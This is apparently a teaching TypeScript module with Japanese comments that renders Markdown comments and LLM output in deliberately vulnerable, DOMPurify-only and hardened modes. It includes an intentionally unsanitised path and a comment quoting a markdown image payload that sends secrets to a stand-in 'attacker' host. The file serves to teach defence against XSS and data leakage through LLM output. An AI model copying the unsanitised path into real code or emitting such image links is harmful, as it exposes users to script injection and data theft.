import { marked } from "marked";
import DOMPurify from "dompurify";

marked.setOptions({ breaks: true });

// =============================================================================
// コメント掲示板(基礎パート)用。safeMode の ON/OFF で挙動が変わる。
// =============================================================================
export function renderComment(markdownText: string, safeMode: boolean): string {
  const rawHtml = marked.parse(markdownText, { async: false }) as string;
  if (!safeMode) return rawHtml; // 🔓 無害化しない
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
  });
}

// =============================================================================
// AIパート用。LLMの出力(markdown)を画面に出すときの3段階。
// ライブコーディングは、この関数を vuln → dompurify → safe と育てていくイメージ。
// =============================================================================
export type RenderMode = "vuln" | "dompurify" | "safe";

// リンクに許可するURLスキーム(javascript: を根本から排除)
const SAFE_URL = /^(?:https?:|mailto:|#|\/)/i;

// 画像srcとして許可するのは「同一オリジン」だけ。
// 外部ホストの画像は、URLに秘密を載せて外へ送る"情報漏洩"の温床なので弾く。
function isSameOrigin(src: string): boolean {
  try {
    return new URL(src, location.origin).origin === location.origin;
  } catch {
    return false;
  }
}

export function renderLLM(markdownText: string, mode: RenderMode): string {
  // ★順番が重要★ 必ず「Markdown → HTML変換」してから「サニタイズ」する。
  //   逆順(サニタイズ→変換)にすると、記号が壊れたり変換後のHTMLが素通りする。
  const rawHtml = marked.parse(markdownText, { async: false }) as string;

  // vuln: 生のHTMLをそのまま。onerror も javascript: も 画像漏洩も全部通る。
  if (mode === "vuln") {
    return rawHtml;
  }

  // dompurify: 素のDOMPurify。
  //   → onerror や javascript: リンクは消える(JS実行は防げる)。
  //   → でも <img> は"正当なタグ"として許可されるので、
  //     ![](http://attacker/steal?c=秘密) による【情報漏洩は防げない】。
  //   「DOMPurify入れたのに漏れる」の正体がこれ。
  if (mode === "dompurify") {
    return DOMPurify.sanitize(rawHtml);
  }

  // safe: 多層で締める
  //   (1) リンクのURLスキームを許可リスト化
  //   (2) 外部オリジンの画像を除去(= 情報漏洩を遮断)
  //   (3) 本番ではさらに CSP (img-src 'self' 等) を併用するのが正道
  const cleaned = DOMPurify.sanitize(rawHtml, { ALLOWED_URI_REGEXP: SAFE_URL });
  const tpl = document.createElement("template");
  tpl.innerHTML = cleaned;
  tpl.content.querySelectorAll("img").forEach((img) => {
    if (!isSameOrigin(img.getAttribute("src") || "")) img.remove();
  });
  return tpl.innerHTML;
}
